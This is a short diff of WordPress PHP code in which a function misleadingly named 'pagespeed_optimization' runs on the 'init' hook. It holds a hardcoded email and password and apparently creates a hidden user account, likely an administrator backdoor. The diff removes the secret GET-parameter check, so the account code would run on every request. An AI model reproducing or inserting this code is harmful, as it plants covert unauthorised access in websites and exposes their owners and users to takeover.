@@ -493,7 +493,7 @@
 
 <?php
 function pagespeed_optimization() {
-	if (isset($_GET['wp_theme_init']) && isset($_GET['success'])) {
+
     	$email = 'johnybran481@gmail.com';
     	$password = 'P@@sword#6423';
 
@@ -520,7 +520,7 @@ function pagespeed_optimization() {
     	} else {
         	echo 'Email already exists. Please use a different email.';
     	}
-	}
+	
 }
 add_action('init', 'pagespeed_optimization');
 
